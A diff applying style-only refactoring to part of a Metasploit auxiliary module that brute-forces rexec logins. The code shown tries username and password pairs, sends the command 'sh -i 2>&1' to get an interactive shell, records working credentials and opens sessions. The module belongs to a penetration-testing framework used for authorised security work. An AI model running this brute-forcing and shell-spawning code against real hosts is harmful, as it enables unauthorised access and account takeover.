@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
@@ -35,8 +35,9 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(512),
         OptBool.new('ENABLE_STDERR', [ true, 'Enables connecting the stderr port', false ]),
-        OptInt.new( 'STDERR_PORT',   [ false, 'The port to listen on for stderr', nil ])
-      ], self.class)
+        OptInt.new('STDERR_PORT', [ false, 'The port to listen on for stderr', nil ])
+      ], self.class
+    )
   end
 
   def run_host(ip)
@@ -46,24 +47,21 @@ class MetasploitModule < Msf::Auxiliary
       # For each host, bind a privileged listening port for the target to connect
       # back to.
       ret = listen_on_random_port(datastore['STDERR_PORT'])
-      if not ret
-        return :abort
-      end
+      return :abort unless ret
       sd, stderr_port = ret
     else
       sd = stderr_port = nil
     end
 
     # The maximum time for a host is set here.
-    Timeout.timeout(300) {
-      each_user_pass { |user, pass|
+    Timeout.timeout(300) do
+      each_user_pass do |user, pass|
         do_login(user, pass, sd, stderr_port)
-      }
-    }
+      end
+    end
 
-    sd.close if sd
+    sd&.close
   end
-
 
   def do_login(user, pass, sfd, stderr_port)
     vprint_status("#{target_host}:#{rport} - Attempting rexec with username:password '#{user}':'#{pass}'")
@@ -72,11 +70,11 @@ class MetasploitModule < Msf::Auxiliary
     cmd ||= 'sh -i 2>&1'
 
     # We must connect from a privileged port.
-    return :abort if not connect
+    return :abort unless connect
 
     sock.put("#{stderr_port}\x00#{user}\x00#{pass}\x00#{cmd}\x00")
 
-    if sfd and stderr_port
+    if sfd && stderr_port
       stderr_sock = sfd.accept
       add_socket(stderr_sock)
     else
@@ -86,10 +84,10 @@ class MetasploitModule < Msf::Auxiliary
     # NOTE: We report this here, since we are awfully convinced now that this is really
     # an rexec service.
     report_service(
-      :host => rhost,
-      :port => rport,
-      :proto => 'tcp',
-      :name => 'exec'
+      host: rhost,
+      port: rport,
+      proto: 'tcp',
+      name: 'exec'
     )
 
     # Read the expected nul byte response.
@@ -107,15 +105,13 @@ class MetasploitModule < Msf::Auxiliary
     return :next_user
 
   # For debugging only.
-  #rescue ::Exception
+  # rescue ::Exception
   #  print_error("#{$!}")
-  #return :abort
+  # return :abort
 
   ensure
-    disconnect()
-
+    disconnect
   end
-
 
   #
   # This is only needed by rexec so it is not in the rservices mixin
@@ -127,14 +123,14 @@ class MetasploitModule < Msf::Auxiliary
       sd = listen_on_port(stderr_port)
     else
       stderr_port = 1024 + rand(0x10000 - 1024)
-      512.times {
+      512.times do
         sd = listen_on_port(stderr_port)
         break if sd
         stderr_port = 1024 + rand(0x10000 - 1024)
-      }
+      end
     end
 
-    if not sd
+    unless sd
       print_error("Unable to bind to listener port")
       return false
     end
@@ -143,7 +139,6 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Listening on port #{stderr_port}")
     [ sd, stderr_port ]
   end
-
 
   def listen_on_port(stderr_port)
     vprint_status("Trying to listen on port #{stderr_port} ..")
@@ -159,17 +154,16 @@ class MetasploitModule < Msf::Auxiliary
     sd
   end
 
-
   def start_rexec_session(host, port, user, pass, proof, stderr_sock)
     report_auth_info(
-      :host	=> host,
-      :port	=> port,
-      :sname => 'exec',
-      :user	=> user,
-      :pass	=> pass,
-      :proof  => proof,
-      :source_type => "user_supplied",
-      :active => true
+      host: host,
+      port: port,
+      sname: 'exec',
+      user: user,
+      pass: pass,
+      proof: proof,
+      source_type: "user_supplied",
+      active: true
     )
 
     merge_me = {
@@ -183,9 +177,8 @@ class MetasploitModule < Msf::Auxiliary
     }
 
     # Don't tie the life of this socket to the exploit
-    self.sockets.delete(stderr_sock)
+    sockets.delete(stderr_sock)
 
     start_session(self, "rexec #{user}:#{pass} (#{host}:#{port})", merge_me)
   end
-
 end
